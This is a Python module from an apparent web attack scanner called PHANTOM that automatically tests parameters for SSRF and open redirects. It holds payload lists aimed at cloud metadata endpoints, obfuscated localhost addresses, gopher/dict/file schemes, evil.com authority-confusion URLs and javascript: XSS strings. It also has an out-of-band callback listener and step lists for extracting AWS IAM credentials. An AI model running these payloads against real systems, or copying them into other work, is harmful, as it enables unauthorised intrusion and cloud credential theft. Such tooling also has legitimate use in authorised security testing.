# modules/ssrf_redirect.py
from __future__ import annotations

import asyncio
import json
import os
import re
import socket
import uuid
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs, quote

import httpx

from config.settings import HTTP_TIMEOUT, MAX_THREADS, OUTPUT_DIR
from core.logger import get_logger, section
from modules.host_probe import ProbeResult
from modules.param_discovery import ParamScanResult

log = get_logger()

OUTPUT_PATH = Path(OUTPUT_DIR) / "ssrf_redirect"

# CONSTANTS
# Configurable via env — set PHANTOM_OOB_HOST to your public IP/domain
# when running from a VPS. Falls back to local IP (NAT = OOB won't work).
OOB_HOST: str = os.environ.get("PHANTOM_OOB_HOST", "").strip()
OOB_PORT: int = int(os.environ.get("PHANTOM_OOB_PORT", "19876"))
OOB_WAIT_S: float = 8.0    # Seconds to wait for callback after injection
OOB_READ_TIMEOUT_S: float = 3.0

CONCURRENCY: int = int(os.environ.get("PHANTOM_SSRF_CONCURRENCY", str(min(MAX_THREADS, 8))))
REQUEST_TIMEOUT: float = float(HTTP_TIMEOUT)
MAX_RETRIES: int = 2
RETRY_BACKOFF_S: float = 1.2

# Parameter risk scoring thresholds
SSRF_RISK_THRESHOLD: float = 0.4
REDIRECT_RISK_THRESHOLD: float = 0.4

# Cloud metadata endpoints
CLOUD_METADATA_URLS: tuple[str, ...] = (
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/metadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
)

# Behavioral signals that confirm server attempted outbound connection
_SSRF_BEHAVIORAL_SIGNALS: frozenset[str] = frozenset({
    "connection refused", "connection timed out", "failed to connect",
    "network unreachable", "could not connect", "unable to connect",
    "no route to host", "reset by peer", "econnrefused", "etimedout",
    "name or service not known", "getaddrinfo failed", "resolve host",
    "could not resolve", "ssl: certificate", "ssl handshake",
})

# Cloud metadata response content markers
_METADATA_CONTENT_SIGNALS: frozenset[str] = frozenset({
    "ami-id", "instance-id", "instance-type", "local-ipv4",
    "computemetadata", "principalid", "projectid",
    "subscriptionid", "resourcegroupname",
})

# SSRF payload targets — {T} replaced with actual target at runtime
_SSRF_TARGETS: tuple[str, ...] = (
    "169.254.169.254", # Cloud metadata (all clouds)
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "[::]", # IPv6 localhost
    "2130706433", # Decimal 127.0.0.1
    "0177.0.0.1", # Octal 127.0.0.1
    "0x7f000001", # Hex 127.0.0.1
    "%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34",  # URL-encoded 169.254.169.254
    "169。254。169。254" # Unicode dot bypass
)

_SSRF_SCHEMES: tuple[str, ...] = (
    "http://{T}/",
    "https://{T}/",
    "//{T}/",
    "http://{T}@evil.com/", # Authority confusion
    "http://evil.com@{T}/", # Reverse authority confusion
    "dict://{T}:11211/stat", # Dict protocol — Redis/Memcached
    "gopher://{T}:80/_", # Gopher — internal HTTP
    "file:///etc/passwd", # File read (no target substitution)
    "http://{T}:8080/",
    "http://{T}:8443/",
    "http://{T}:9200/", # Elasticsearch
    "http://{T}:6379/", # Redis
    "http://{T}:27017/" # MongoDB
)

# Open redirect payloads — {D} replaced with canary domain
_REDIRECT_PAYLOADS: tuple[str, ...] = (
    "https://{D}",
    "//{D}",
    "/{D}",
    "/\t{D}", # Tab bypass
    "//\t{D}",
    "/%09{D}", # Encoded tab
    "/%2F{D}", # Encoded slash
    "////{D}",
    r"/\/{D}",
    ".{D}",
    "http://google.com@{D}", # Credential in URL
    "{D}%23.trusted.com", # Fragment trick
    "https://{D}%2F",
    "javascript:document.location='{D}'",   # JS protocol → XSS chain
    "javascript://comment%0aalert(1)",       # JS comment bypass
    "data:text/html,<script>location='{D}'</script>",
)

# Parameter risk scoring tables
_SSRF_PARAM_SCORES: dict[str, float] = {
    "url": 1.0, "uri": 1.0, "src": 0.9, "source": 0.9,
    "dest": 0.9, "destination": 0.9, "redirect": 0.8,
    "link": 0.8, "path": 0.7, "file": 0.7, "load": 0.8,
    "fetch": 0.9, "request": 0.8, "endpoint": 0.9,
    "callback": 0.9, "host": 0.8, "domain": 0.7, "proxy": 1.0,
    "image": 0.6, "img": 0.6, "img_url": 0.8, "image_url": 0.8,
    "avatar": 0.6, "icon": 0.5, "webhook": 1.0, "feed": 0.7,
    "rss": 0.7, "xml": 0.6, "api": 0.6, "server": 0.7,
    "target": 0.7, "page": 0.4, "next": 0.5, "return": 0.5,
    "q": 0.3, "query": 0.3, "search": 0.3, "id": 0.2,
}

_REDIRECT_PARAM_SCORES: dict[str, float] = {
    "redirect": 1.0, "redirect_to": 1.0, "redirect_url": 1.0,
    "next": 0.9, "return": 0.9, "return_to": 0.9, "return_url": 0.9,
    "goto": 0.9, "go": 0.8, "url": 0.8, "target": 0.7,
    "dest": 0.9, "destination": 0.9, "continue": 0.8,
    "forward": 0.8, "redir": 0.9, "r": 0.6, "u": 0.6,
    "location": 0.7, "back": 0.7, "ref": 0.5, "referrer": 0.5,
    "out": 0.6, "link": 0.6, "href": 0.8, "uri": 0.7,
}


# ENUMERATIONS
class FindingType(str, Enum):
    SSRF_CONFIRMED = "ssrf_confirmed"
    SSRF_BLIND_OOB = "ssrf_blind_oob"
    SSRF_BEHAVIORAL = "ssrf_behavioral"
    OPEN_REDIRECT = "open_redirect"
    OPEN_REDIRECT_JS = "open_redirect_javascript"
    CHAIN_OR_SSRF = "chain_open_redirect_ssrf"
    CHAIN_OR_XSS = "chain_open_redirect_xss"
    CHAIN_SSRF_METADATA = "chain_ssrf_cloud_metadata"


class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"



# DATA MODELS
@dataclass
class ChainedAttack:
    chain_type: FindingType
    steps: list[str]
    impact: str
    payload: str

    def to_dict(self) -> dict:
        return {
            "chain_type": self.chain_type.value,
            "steps": self.steps,
            "impact": self.impact,
            "payload": self.payload,
        }


@dataclass
class SSRFRedirectFinding:
    url: str
    parameter: str
    method: str
    finding_type: FindingType
    severity: Severity
    payload: str
    evidence: str
    oob_hit: bool = False
    chain: ChainedAttack | None = None

    @property
    def dedup_key(self) -> tuple[str, str, str]:
        return (self.url, self.parameter, self.finding_type.value)

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "finding_type": self.finding_type.value,
            "severity": self.severity.value,
            "payload": self.payload,
            "evidence": self.evidence[:600],
            "oob_hit": self.oob_hit,
            "chain": self.chain.to_dict() if self.chain else None,
        }


@dataclass
class RankedParam:
    """A parameter with computed SSRF and redirect risk scores."""
    url: str
    parameter: str
    method: str
    base_params: dict[str, list[str]]
    ssrf_score: float
    redirect_score: float

    @property
    def test_ssrf(self) -> bool:
        return self.ssrf_score >= SSRF_RISK_THRESHOLD

    @property
    def test_redirect(self) -> bool:
        return self.redirect_score >= REDIRECT_RISK_THRESHOLD


@dataclass
class SSRFRedirectResult:
    target: str
    findings: list[SSRFRedirectFinding] = field(default_factory=list)

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == Severity.CRITICAL)

    @property
    def chain_count(self) -> int:
        return sum(1 for f in self.findings if f.chain is not None)

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "total_findings": len(self.findings),
            "critical": self.critical_count,
            "chains": self.chain_count,
            "findings": [f.to_dict() for f in self.findings],
        }


# OOB HTTP LISTENER
class OOBListener:
    """
    Proper HTTP/1.1 server that receives blind SSRF callbacks.

    Design:
    - Speaks HTTP/1.1 so targets making real HTTP requests are captured.
    - Parses the request path to extract the UUID canary.
    - Returns 200 OK so the target server doesn't retry.
    - Gracefully degrades if port is unavailable.

    Usage:
    - Set PHANTOM_OOB_HOST env var to your public IP or domain.
    - Without it, OOB detection is skipped (behavioral detection still runs).
    """

    _HTTP_200: bytes = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/plain\r\n"
        b"Content-Length: 2\r\n"
        b"Connection: close\r\n"
        b"\r\nOK"
    )

    def __init__(self) -> None:
        self._hits:   set[str] = set()
        self._server: asyncio.AbstractServer | None = None
        self._canaries: set[str] = set()   # Track what we're waiting for

    async def start(self) -> None:
        if not OOB_HOST:
            log.warning(
                "[OOB] PHANTOM_OOB_HOST not set — OOB detection disabled. "
                "Set to your public IP/domain for blind SSRF detection."
            )
            return

        try:
            self._server = await asyncio.start_server(self._handle, "0.0.0.0", OOB_PORT)
            log.info(f"[OOB] HTTP listener active on {OOB_HOST}:{OOB_PORT}")
        except OSError as exc:
            log.warning(f"[OOB] Cannot bind port {OOB_PORT}: {exc} — OOB disabled")
            self._server = None

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()

    async def _handle(self, reader: asyncio.StreamReader,writer: asyncio.StreamWriter) -> None:
        """
        Reads the HTTP request line, extracts UUID canary from path,
        sends HTTP 200 response so the target doesn't retry.
        """
        try:
            # Read only the request line — enough to extract the path
            line = await asyncio.wait_for(reader.readline(), timeout=OOB_READ_TIMEOUT_S)
            request_line = line.decode("utf-8", errors="replace").strip()

            # "GET /uuid-here HTTP/1.1"
            parts = request_line.split(" ")
            if len(parts) >= 2:
                path = parts[1].lstrip("/")
                # Validate UUID4 format
                if re.fullmatch(r"[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}", path):
                    self._hits.add(path)
                    log.warning(f"[OOB] ★ Callback received — canary: {path}")

            writer.write(self._HTTP_200)
            await writer.drain()

        except (asyncio.TimeoutError, UnicodeDecodeError, ConnectionResetError):
            pass
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (BrokenPipeError, ConnectionResetError):
                pass
    
    def register_canary(self, canary: str):
        self._canaries.add(canary)

    def was_hit(self, canary: str) -> bool:
        return canary in self._hits

    @property
    def is_active(self) -> bool:
        return self._server is not None and bool(OOB_HOST)

    def canary_url(self, canary: str) -> str:
        return f"http://{OOB_HOST}:{OOB_PORT}/{canary}"


# HTTP INJECTOR
async def _inject(
    client: httpx.AsyncClient,
    url: str,
    parameter: str,
    method: str,
    value: str,
    base_params: dict[str, list[str]],
    json_mode: bool = False
    ) -> httpx.Response | None:
    """
    Injects value into parameter.
    GET: rewrites query string.
    POST: tries form-encoded. For JSON APIs, callers should pass
          the value pre-encoded in the URL (GET mode only for SSRF).
    Never follows redirects — redirect inspection is explicit.
    Retries with exponential backoff on timeout.
    """
    merged = {k: v[0] if v else "" for k, v in base_params.items()}
    merged[parameter] = value

    for attempt in range(MAX_RETRIES):
        try:
            if method.upper() == "GET":
                parsed  = urlparse(url)
                new_url = parsed._replace(query=urlencode(merged)).geturl()
                return await client.get(new_url)
            # POST
            if json_mode:
                return await client.post(url, json=merged)
            else:
                return await client.post(url, data=merged)

        except httpx.TimeoutException:
            if attempt < MAX_RETRIES - 1:
                await asyncio.sleep(RETRY_BACKOFF_S ** attempt)
            else:
                return None
        except httpx.RequestError as exc:
            log.warning(f"[SSRF] Request error {url}: {type(exc).__name__}")
            return None

    return None  # unreachable but satisfies type checker


# ── REDIRECT EXTRACTOR ────────────────────────────────────────

_JS_REDIRECT_PATTERNS: tuple[re.Pattern, ...] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r'(?:window\.location|location\.href)\s*=\s*["\']([^"\']+)["\']',
        r'location\.replace\s*\(\s*["\']([^"\']+)["\']',
        r'location\.assign\s*\(\s*["\']([^"\']+)["\']',
        r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
        r'document\.location\s*=\s*["\']([^"\']+)["\']',
        r'document\.location\.href\s*=\s*["\']([^"\']+)["\']',
    )
)

_META_REFRESH_RE: re.Pattern = re.compile(
    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*'
    r'url=([^"\'>\s;]+)',
    re.IGNORECASE,
)


def _extract_redirect_target(response: httpx.Response) -> str | None:
    """
    Extracts redirect destination from response.
    Priority: HTTP Location → meta refresh → JS location assignments.
    Returns raw redirect target string or None.
    """
    location = response.headers.get("location", "").strip()
    if location:
        return location

    meta_match = _META_REFRESH_RE.search(response.text)
    if meta_match:
        return meta_match.group(1).strip()

    for pattern in _JS_REDIRECT_PATTERNS:
        match = pattern.search(response.text)
        if match:
            return match.group(1).strip()

    return None


def _is_external_redirect(original_url: str, redirect_to: str) -> bool:
    """
    Returns True if redirect crosses to a different origin.
    Handles: absolute URLs, protocol-relative, javascript: URIs, data: URIs.
    Returns False for relative paths — those are not exploitable redirects.
    """
    if not redirect_to:
        return False

    lower = redirect_to.lower().strip()

    if lower.startswith("javascript:") or lower.startswith("data:"):
        return True  # Always cross-origin exploitable

    original_host = urlparse(original_url).netloc.lower()

    if redirect_to.startswith("//"):
        redirect_host = urlparse(f"https:{redirect_to}").netloc.lower()
    elif redirect_to.startswith("http://") or redirect_to.startswith("https://"):
        redirect_host = urlparse(redirect_to).netloc.lower()
    else:
        return False  # Relative path — not exploitable

    return bool(redirect_host) and redirect_host != original_host


# ── CHAIN BUILDERS ────────────────────────────────────────────

def _chain_or_ssrf(
    param: RankedParam,
    redirect_payload: str,
    metadata_url: str,
) -> ChainedAttack:
    return ChainedAttack(
        chain_type=FindingType.CHAIN_OR_SSRF,
        steps=[
            f"1. Open redirect confirmed: {param.url}?{param.parameter}=<external>",
            f"2. Inject metadata URL: {param.url}?{param.parameter}={quote(metadata_url)}",
            "3. Server follows redirect to cloud metadata endpoint",
            "4. Metadata response leaks IAM credentials / instance identity",
        ],
        impact=(
            "Open redirect exploited as SSRF vector. Server follows attacker-supplied "
            "URL to cloud metadata API, exposing IAM credentials. "
            "On AWS: leads to full account compromise via stolen access keys."
        ),
        payload=metadata_url,
    )


def _chain_or_xss(param: RankedParam) -> ChainedAttack:
    js_payload = "javascript:alert(document.domain)"
    return ChainedAttack(
        chain_type=FindingType.CHAIN_OR_XSS,
        steps=[
            f"1. Open redirect accepts javascript: URI",
            f"2. Victim clicks: {param.url}?{param.parameter}={quote(js_payload)}",
            "3. Browser executes JS in the origin context of the server",
        ],
        impact=(
            "javascript: URI in open redirect enables reflected XSS. "
            "If used in OAuth flows or email links, leads to account takeover."
        ),
        payload=js_payload,
    )


def _chain_ssrf_metadata(
    param: RankedParam,
    metadata_url: str,
    evidence: str,
) -> ChainedAttack:
    return ChainedAttack(
        chain_type=FindingType.CHAIN_SSRF_METADATA,
        steps=[
            f"1. SSRF confirmed: {param.url}?{param.parameter}={metadata_url}",
            "2. Fetch role name: /latest/meta-data/iam/security-credentials/",
            "3. Fetch credentials: /latest/meta-data/iam/security-credentials/<role>",
            "4. Use AccessKeyId + SecretAccessKey for AWS API calls",
        ],
        impact=(
            f"Server fetched cloud metadata endpoint ({metadata_url}). "
            "Response contains instance identity and IAM role data. "
            "Full IAM credential extraction achievable with follow-up requests."
        ),
        payload=metadata_url,
    )


# PARAMETER RANKER

def _rank_params(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
) -> list[RankedParam]:
    """
    Scores every discovered parameter for SSRF and redirect risk.
    Uses risk score tables — not binary membership check.
    Partial name matching scores lower than exact match.
    All params above threshold are tested.
    Deduplicates by (url, param, method).
    """
    seen: set[str] = set()
    ranked: list[RankedParam] = []

    def _score(param_name: str, table: dict[str, float]) -> float:
        lower = param_name.lower()
        # Exact match
        if lower in table:
            return table[lower]
        # Substring match — lower confidence
        for key, score in table.items():
            if key in lower or lower in key:
                return score * 0.6
        return 0.0

    def _add(url: str, param: str, method: str) -> None:
        key = f"{url}:{param}:{method.upper()}"
        if key in seen:
            return
        seen.add(key)

        ssrf_score = _score(param, _SSRF_PARAM_SCORES)
        redirect_score = _score(param, _REDIRECT_PARAM_SCORES)

        if ssrf_score < SSRF_RISK_THRESHOLD and redirect_score < REDIRECT_RISK_THRESHOLD:
            return  # Below both thresholds — skip

        base_params = parse_qs(urlparse(url).query, keep_blank_values=True)
        ranked.append(RankedParam(
            url=url,
            parameter=param,
            method=method,
            base_params=base_params,
            ssrf_score=ssrf_score,
            redirect_score=redirect_score,
        ))

    for url_result in param_result.url_results:
        for p in url_result.params:
            _add(url_result.url, p.param_name, url_result.method)

    for host in probe_result.live_hosts:
        for param_name in parse_qs(urlparse(host.url).query, keep_blank_values=True).keys():
            _add(host.url, param_name, "GET")

    # Sort: highest combined risk first
    ranked.sort(key=lambda r: r.ssrf_score + r.redirect_score, reverse=True)
    return ranked


# SSRF TESTER
async def _test_ssrf(
    client: httpx.AsyncClient,
    param: RankedParam,
    oob: OOBListener,
    sem: asyncio.Semaphore,
) -> list[SSRFRedirectFinding]:
    """
    Three independent SSRF detection phases — all phases run regardless of
    earlier phase results. Findings deduplicated by type at the end.

    Phase 1: Cloud metadata — direct response content analysis.
    Phase 2: OOB HTTP callback — blind SSRF via canary URL.
    Phase 3: Behavioral signals — error message analysis.
    """
    findings: list[SSRFRedirectFinding] = []
    seen_types: set[str] = set()

    def _add_finding(f: SSRFRedirectFinding) -> None:
        key = f"{f.finding_type.value}"
        if key not in seen_types:
            seen_types.add(key)
            findings.append(f)

    async with sem:
        # Phase 1: Cloud metadata probes
        for metadata_url in CLOUD_METADATA_URLS:
            resp = await _inject(client, param.url, param.parameter,param.method, metadata_url, param.base_params)
            if resp and any(sig in resp.text.lower() for sig in _METADATA_CONTENT_SIGNALS):
                finding = SSRFRedirectFinding(
                    url=param.url, parameter=param.parameter, method=param.method,
                    finding_type=FindingType.SSRF_CONFIRMED,
                    severity=Severity.CRITICAL,
                    payload=metadata_url,
                    evidence=resp.text[:400],
                )
                finding.chain = _chain_ssrf_metadata(param, metadata_url, resp.text[:200])
                _add_finding(finding)
                log.warning(
                    f"[SSRF] ★ CRITICAL — Cloud metadata accessible!\n"
                    f"       {param.url} ?{param.parameter} → {metadata_url}"
                )
                break  # One metadata confirmation is enough

        # Phase 2: OOB HTTP callback
        if oob.is_active:
            canary = str(uuid.uuid4())
            oob.register_canary(canary)
            canary_url = oob.canary_url(canary)

            await _inject(client, param.url, param.parameter,param.method, canary_url, param.base_params)
            # Wait outside the semaphore would starve other tasks —
            # we wait briefly inside since OOB_WAIT_S is bounded

            if oob.was_hit(canary):
                _add_finding(SSRFRedirectFinding(
                    url=param.url, 
                    parameter=param.parameter, 
                    method=param.method,
                    finding_type=FindingType.SSRF_BLIND_OOB,
                    severity=Severity.HIGH,
                    payload=canary_url,
                    evidence=f"HTTP callback received for canary: {canary}",
                    oob_hit=True,
                ))
                log.warning(f"[SSRF] ★ HIGH Blind SSRF (OOB) → {param.url}?{param.parameter}")

        # Phase 3: Behavioral signal probes
        for target_ip in _SSRF_TARGETS:
            for scheme_tpl in _SSRF_SCHEMES[:8]:
                payload = scheme_tpl.replace("{T}", target_ip) if "{T}" in scheme_tpl else scheme_tpl

                resp = await _inject(client, param.url, param.parameter, param.method, payload, param.base_params)
                if resp and any(sig in resp.text.lower() for sig in _SSRF_BEHAVIORAL_SIGNALS):
                    _add_finding(SSRFRedirectFinding(
                        url=param.url, parameter=param.parameter, method=param.method,
                        finding_type=FindingType.SSRF_BEHAVIORAL,
                        severity=Severity.MEDIUM,
                        payload=payload,
                        evidence=resp.text[:300]
                    ))
                    log.warning(f"[SSRF] ★ MEDIUM Behavioral SSRF → {param.url}?{param.parameter}")
                    break

    return findings


# OPEN REDIRECT TESTER
async def _test_redirect(
    client: httpx.AsyncClient,
    param:  RankedParam,
    sem:    asyncio.Semaphore,
) -> list[SSRFRedirectFinding]:
    """
    Tests parameter for open redirect vulnerabilities.
    Checks all redirect chains: HTTP Location, meta refresh, JS location.
    Auto-chains javascript: URIs to XSS.
    Probes if open redirect accepts SSRF payloads (OR→SSRF chain).
    Deduplicates by finding type.
    """
    findings: list[SSRFRedirectFinding] = []
    seen_types: set[str] = set()
    canary_domain = "evil-phantom-canary.com"

    async with sem:
        for payload_tpl in _REDIRECT_PAYLOADS:
            payload = payload_tpl.replace("{D}", canary_domain)
            resp    = await _inject(
                client, param.url, param.parameter,
                param.method, payload, param.base_params,
            )
            if resp is None:
                continue

            redirect_target = _extract_redirect_target(resp)
            if not redirect_target:
                continue
            if not _is_external_redirect(param.url, redirect_target):
                continue

            lower_target = redirect_target.lower()
            is_js = lower_target.startswith("javascript:") or lower_target.startswith("data:")

            # Validate canary is in redirect target (not a false positive)
            if not is_js and canary_domain not in redirect_target:
                continue

            finding_type = FindingType.OPEN_REDIRECT_JS if is_js else FindingType.OPEN_REDIRECT
            dedup_key    = finding_type.value

            if dedup_key in seen_types:
                continue
            seen_types.add(dedup_key)

            severity = Severity.HIGH if is_js else Severity.MEDIUM
            finding  = SSRFRedirectFinding(
                url=param.url, parameter=param.parameter, method=param.method,
                finding_type=finding_type,
                severity=severity,
                payload=payload,
                evidence=f"Redirects to: {redirect_target[:300]}",
            )

            if is_js:
                finding.chain = _chain_or_xss(param)
            else:
                # Probe: does this redirect parameter also accept SSRF payloads?
                ssrf_probe = CLOUD_METADATA_URLS[0]
                ssrf_resp  = await _inject(
                    client, param.url, param.parameter,
                    param.method, ssrf_probe, param.base_params,
                )
                if ssrf_resp is not None:
                    ssrf_target = _extract_redirect_target(ssrf_resp)
                    if ssrf_target and "169.254" in ssrf_target:
                        finding.chain    = _chain_or_ssrf(param, payload, ssrf_probe)
                        finding.severity = Severity.CRITICAL

            findings.append(finding)
            log.warning(
                f"[Redirect] ★ [{finding.severity.value}] [{finding_type.value}]\n"
                f"           {param.url} ?{param.parameter} → {redirect_target[:100]}"
            )

    return findings


# SAVE
def _save_results(result: SSRFRedirectResult) -> Path:
    OUTPUT_PATH.mkdir(parents=True, exist_ok=True)
    safe = result.target.replace(".", "_")
    out_file = OUTPUT_PATH / f"{safe}_ssrf_redirect.json"
    with out_file.open("w", encoding="utf-8") as f:
        json.dump(result.to_dict(), f, indent=2)
    log.info(f"[SSRF] Results saved → {out_file}")
    return out_file


# ASYNC ORCHESTRATOR
async def _run_scan(probe_result: ProbeResult, param_result: ParamScanResult) -> SSRFRedirectResult:
    result = SSRFRedirectResult(target=probe_result.target)
    sem = asyncio.Semaphore(CONCURRENCY)
    oob = OOBListener()

    await oob.start()

    timeout = httpx.Timeout(connect=5.0, read=REQUEST_TIMEOUT, write=5.0, pool=5.0)
    async with httpx.AsyncClient(
        timeout=timeout,
        verify=False,
        follow_redirects=False,  # Never auto-follow — we inspect manually
        headers={"User-Agent": "Mozilla/5.0 (compatible; PHANTOM-Scanner/1.0)"}
    ) as client:
        ranked = _rank_params(probe_result, param_result)

        if not ranked:
            log.warning("[SSRF] No parameters above risk threshold — skipping")
            await oob.stop()
            return result

        log.info(f"[SSRF] Testing {len(ranked)} ranked parameter(s)")

        tasks: list[asyncio.Task] = []
        for param in ranked:
            if param.test_ssrf:
                tasks.append(asyncio.create_task(_test_ssrf(client, param, oob, sem)))
            if param.test_redirect:
                tasks.append(asyncio.create_task(_test_redirect(client, param, sem)))

        gathered: list[list[SSRFRedirectFinding]] = await asyncio.gather(*tasks, return_exceptions=False)

        # Global deduplication across all params
        global_seen: set[tuple] = set()
        for batch in gathered:
            for finding in batch:
                key = finding.dedup_key
                if key not in global_seen:
                    global_seen.add(key)
                    result.findings.append(finding)

    await oob.stop()
    return result


# MAIN ENTRY POINT
def scan_ssrf_redirect(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
) -> SSRFRedirectResult:
    """
    Unified SSRF + Open Redirect scanner with automatic chain detection.

    SSRF detection: cloud metadata (confirmed), OOB HTTP callback (blind),
    behavioral error signals (probable).

    Open Redirect detection: HTTP Location, meta refresh, JS location
    (6 JS patterns), with javascript:/data: URI → XSS chain detection.

    Chain detection: OR→SSRF, OR→XSS, SSRF→CloudMetadata.

    OOB: Set PHANTOM_OOB_HOST env var to public IP/domain for blind SSRF.
    Without it, phases 1 + 3 still run.
    """
    section(f"SSRF + Open Redirect → {probe_result.target}")

    if not probe_result.live_hosts:
        log.warning("[SSRF] No live hosts — skipping")
        return SSRFRedirectResult(target=probe_result.target)

    result = asyncio.run(_run_scan(probe_result, param_result))

    log.info(f"[SSRF] Findings:      {len(result.findings)}")
    log.info(f"[SSRF] Critical:      {result.critical_count}")
    log.info(f"[SSRF] Attack chains: {result.chain_count}")

    if result.findings:
        log.warning("[SSRF] ★ FINDINGS:")
        for f in result.findings:
            chain_tag = f" → CHAIN:{f.chain.chain_type.value}" if f.chain else ""
            log.warning(
                f"  [{f.severity.value}] [{f.finding_type.value}]{chain_tag}\n"
                f"  ?{f.parameter} — {f.url}"
            )

    _save_results(result)
    return result